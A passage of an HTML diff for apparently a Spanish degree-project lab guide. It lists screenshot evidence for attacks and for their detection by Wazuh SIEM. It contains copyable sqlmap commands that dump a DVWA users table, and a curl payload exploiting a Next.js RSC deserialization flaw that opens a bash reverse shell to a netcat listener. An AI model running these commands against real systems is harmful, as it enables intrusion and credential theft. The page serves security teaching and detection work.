+                            [Captura 8: DevTools Cookies storage showing PHPSESSID value]
+                        </div>
+                    </div>
+
+                    <!-- Comandos SQLMap -->
+                    <div class="mt-4 space-y-4">
+                        <h4 class="font-bold text-slate-900 text-sm">Flujo de comandos ejecutados en Kali Linux:</h4>
+                        
+                        <div class="code-shell">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                <span>Paso 1: Identificación e Inyección (Obtención de DBs)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap1')">Copiar</button>
+                            </div>
+                            <pre id="c-sqlmap1" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_SESION_COOKIE" --batch --dbs</code></pre>
+                        </div>
+
+                        <!-- Captura 9 -->
+                        <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                            <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                                📸 CAPTURA 9 — SQLMap detectando la inyección
+                            </span>
+                            <p class="text-xs text-slate-700 font-semibold">Debe mostrar en consola: Parámetro afectado (Parameter: id), tipo de inyección y base de datos trasera detectada (DBMS: MariaDB).</p>
+                            <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                                [Captura 9: SQLMap detection output showing Union Query / Boolean-based]
+                            </div>
+                        </div>
+
+                        <!-- Captura 10 -->
+                        <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                            <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                                📸 CAPTURA 10 — SQLMap Listando Bases de Datos
+                            </span>
+                            <p class="text-xs text-slate-700 font-semibold">Debe mostrar en consola: El listado completo de bases de datos disponibles (<code class="code-font text-red-700">dvwa</code>, <code class="code-font text-red-700">mysql</code>, <code class="code-font text-red-700">information_schema</code>).</p>
+                            <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                                [Captura 10: SQLMap output listing databases dvwa, mysql]
+                            </div>
+                        </div>
+
+                        <div class="code-shell mt-4">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                <span>Paso 2: Obtención de tablas de la base de datos de DVWA</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap2')">Copiar</button>
+                            </div>
+                            <pre id="c-sqlmap2" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_SESION_COOKIE" -D dvwa --tables --batch</code></pre>
+                        </div>
+
+                        <div class="code-shell mt-4">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                                <span>Paso 3: Exfiltración de credenciales (Dump de tablas)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-sqlmap3')">Copiar</button>
+                            </div>
+                            <pre id="c-sqlmap3" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=TU_SESION_COOKIE" -D dvwa -T users --dump --batch</code></pre>
+                        </div>
+
+                        <!-- Captura 11 -->
+                        <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                            <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                                📸 CAPTURA 11 — SQLMap Exfiltrando Usuarios y Hashes
+                            </span>
+                            <p class="text-xs text-slate-700 font-semibold">Debe mostrar en consola: La tabla desencriptada/descargada con columnas como <code class="code-font">user</code>, <code class="code-font">password/hash</code> y correos electrónicos.</p>
+                            <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                                [Captura 11: SQLMap users table dump output showing admin credentials]
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Sección 4: Explotación Sistema: React2Shell (RCE) -->
+            <section id="rce" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <div class="flex items-center gap-3">
+                    <h3 class="text-2xl font-bold text-slate-950">🐚 Ejecución Remota de Código (React2Shell RCE)</h3>
+                </div>
+                <p class="text-slate-650 leading-relaxed">
+                    Explotación de la vulnerabilidad crítica en Next.js (CVE-2025-55182) para disparar un comando remoto por payload de deserialización de componentes de servidor React, obteniendo una shell interactiva sobre el contenedor de la aplicación.
+                </p>
+
+                <!-- Evidencias React2Shell -->
+                <div class="space-y-6">
+                    <h4 class="font-extrabold text-slate-900 text-lg">📊 Evidencias Requeridas de RCE React2Shell</h4>
+
+                    <!-- Captura 12 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 12 — Configuración del Listener Netcat
+                        </span>
+                        <p class="text-xs text-slate-600">Preparación del puerto de escucha en la máquina Kali del atacante.</p>
+                        <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: Ejecución del comando de escucha <code class="code-font text-red-700 bg-white px-1">nc -lvnp 4444</code> en la terminal y su correspondiente mensaje de espera.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 12: Netcat listener started on port 4444]
+                        </div>
+                    </div>
+
+                    <!-- Captura 13 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 13 — Ejecución del Exploit de Ataque
+                        </span>
+                        <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: Ejecución del script en Python o la ejecución manual del comando <code class="code-font text-red-700 bg-white px-1">curl</code> enviando los componentes maliciosos al API REST.</p>
+                        
+                        <div class="code-shell mt-2">
+                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-2 text-xs text-slate-600">
+                                <span>Payload Curl Alternativo (RSC payload)</span>
+                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-curl-exploit')">Copiar</button>
+                            </div>
+                            <pre id="c-curl-exploit" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>curl -X POST -H "Content-Type: text/x-component" --data-binary $'1:I\n2:O{"command":"bash -c '\''bash -i >& /dev/tcp/IP_KALI/4444 0>&1'\''"}' https://webinsegura1.duckdns.org/api/rsc -k</code></pre>
+                        </div>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 13: Exploit execution payload curl or script python]
+                        </div>
+                    </div>
+
+                    <!-- Captura 14 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 14 — Reverse Shell Recibida en Kali
+                        </span>
+                        <p class="text-xs text-slate-700 font-semibold">Debe mostrarse claramente: En el netcat de Kali, el aviso <code class="code-font">connect to [IP_KALI] from (IP_LAB_PI)</code> confirmando el establecimiento del túnel.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 14: Netcat connection received confirmation]
+                        </div>
+                    </div>
+
+                    <!-- Captura 15 (¡Súper Importante!) -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-300 bg-red-50/40 p-5 space-y-3 relative overflow-hidden">
+                        <div class="absolute top-0 right-0 bg-red-600 text-white text-[8px] font-black tracking-widest px-3 py-1 uppercase rounded-bl-lg">CRÍTICA PARA EL TFG</div>
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-200 px-3 py-1 text-xs font-extrabold text-red-950">
+                            📸 CAPTURA 15 — Validación de Ejecución de Comandos (RCE)
+                        </span>
+                        <p class="text-xs text-slate-600 font-semibold">Es la evidencia innegable de la intrusión dentro de la máquina Linux objetivo.</p>
+                        <div class="code-shell mt-2">
+                            <pre class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>whoami
+id
+hostname
+pwd
+uname -a</code></pre>
+                        </div>
+                        <p class="text-xs text-slate-700 font-semibold">El resultado esperado debe mostrar el rol de ejecución: <code class="code-font font-semibold text-red-700">node (uid=1000)</code> o <code class="code-font font-semibold text-red-700">www-data (uid=33)</code>.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 15: Interactive shell command output whoami and id details]
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Sección 5: Detección y Correlación SOC (Wazuh SIEM) -->
+            <section id="wazuh" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <div class="flex items-center gap-3">
+                    <h3 class="text-2xl font-bold text-slate-950">🛡️ Detección y Correlación SOC (Wazuh SIEM)</h3>
+                </div>
+                <p class="text-slate-650 leading-relaxed">
+                    Evidencias fundamentales para justificar la integración del Blue Team. Wazuh correlaciona las trazas ofensivas generadas en Apache2 y en los contenedores Docker, generando alertas en tiempo real en la consola de seguridad.
+                </p>
+
+                <!-- Evidencias Wazuh -->
+                <div class="space-y-6">
+                    <h4 class="font-extrabold text-slate-900 text-lg">📊 Evidencias Requeridas de Wazuh</h4>
+
+                    <!-- Captura 21 (Ahora Captura 21 - Renombrada) -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 21 — Dashboard Principal de Wazuh
+                        </span>
+                        <p class="text-xs text-slate-750 font-semibold">Debe verse: Número de agentes activos (el servidor Ubuntu y la Raspberry Pi), el conteo de alertas categorizadas y la distribución por niveles de severidad (Critical, High, Medium).</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 21: Wazuh dashboard overall view and active agents]
+                        </div>
+                    </div>
+
+                    <!-- Captura 22 (Ahora Captura 22) -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 22 — SQL Injection Detectada
+                        </span>
+                        <p class="text-xs text-slate-700 font-semibold">Debe mostrarse claramente: El registro de alerta con la regla <code class="code-font text-red-700 font-bold">Rule ID 31103</code> (SQL injection attempt) originada en la IP de Kali.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 22: Wazuh alert details for Rule ID 31103 SQL Injection]
+                        </div>
+                    </div>
+
+                    <!-- Captura 23 (Ahora Captura 23 - ¡Súper Importante!) -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-300 bg-red-50/40 p-5 space-y-3 relative overflow-hidden">
+                        <div class="absolute top-0 right-0 bg-red-600 text-white text-[8px] font-black tracking-widest px-3 py-1 uppercase rounded-bl-lg">CRÍTICA PARA EL TFG</div>
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-200 px-3 py-1 text-xs font-extrabold text-red-950">
+                            📸 CAPTURA 23 — React2Shell Detectada por Wazuh
+                        </span>
+                        <p class="text-xs text-slate-750 font-semibold">Debe mostrarse claramente: Alerta crítica personalizada con <code class="code-font text-red-700 font-bold">Rule ID 100503</code> correspondiente a la inyección RSC y la creación sospechosa de hilos/procesos hijo de Node.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 23: Wazuh alert details for Rule ID 100503 React2Shell RCE]
+                        </div>
+                    </div>
+
+                    <!-- Captura 24 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 24 — Timeline de la Intrusión
+                        </span>
+                        <p class="text-xs text-slate-700 font-semibold">Debe reflejar: Gráfico temporal o tabla indicando la hora del ataque, host comprometido y las alertas agrupadas por orden cronológico.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 24: Wazuh events timeline showing offensive execution history]
+                        </div>
+                    </div>
+                </div>
+            <!-- Barra de Navegación de Flujo Flotante (Bottom) -->
+            <footer class="flex items-center justify-between rounded-3xl border border-slate-200 bg-white p-6 shadow-xl">
+                <span class="text-xs text-slate-500 font-medium">Nota: Puedes volver atrás en cualquier momento pulsando la flecha flotante en la esquina superior derecha.</span>
+                <a href="post_explotacion.html" class="inline-flex items-center gap-2 rounded-xl bg-red-600 px-4 py-2.5 text-sm font-bold text-white shadow-md hover:bg-red-700 transition-colors">
+                    Siguiente: Post-Explotación &rarr;
+                </a>
+            </footer>
+        </section>
+    </main>
+    <script src="../assets/js/sidebar.js"></script>
+    <script src="../assets/js/lightbox.js"></script>
+    <!-- Script de integración de Mermaid con Lightbox modal -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            setTimeout(() => {
+                const container = document.getElementById('mermaid-container');
+                if (!container) return;
+                
+                container.addEventListener('click', () => {
+                    const svg = container.querySelector('svg');
+                    if (!svg) return;
+                    
+                    try {
+                        const svgString = new XMLSerializer().serializeToString(svg);
+                        const svgBlob = new Blob([svgString], { type: 'image/svg+xml;charset=utf-8' });
+                        const blobURL = URL.createObjectURL(svgBlob);
+                        
+                        const lightboxModal = document.getElementById('image-lightbox-modal');
+                        const lightboxImg = document.getElementById('lightbox-img');
+                        
+                        if (lightboxModal && lightboxImg) {
+                            lightboxImg.src = blobURL;
+                            lightboxImg.style.transform = 'translate(0px, 0px) scale(1)';
+                            lightboxModal.classList.remove('hidden');
+                            setTimeout(() => {
+                                lightboxModal.classList.remove('opacity-0');
+                                lightboxModal.classList.add('opacity-100');
+                            }, 10);
+                        }
+                    } catch (error) {
+                        console.error("Fallo al exportar Mermaid SVG a Lightbox:", error);
+                    }
+                });
+            }, 800);
+        });
+    </script>
+</body>
+</html>
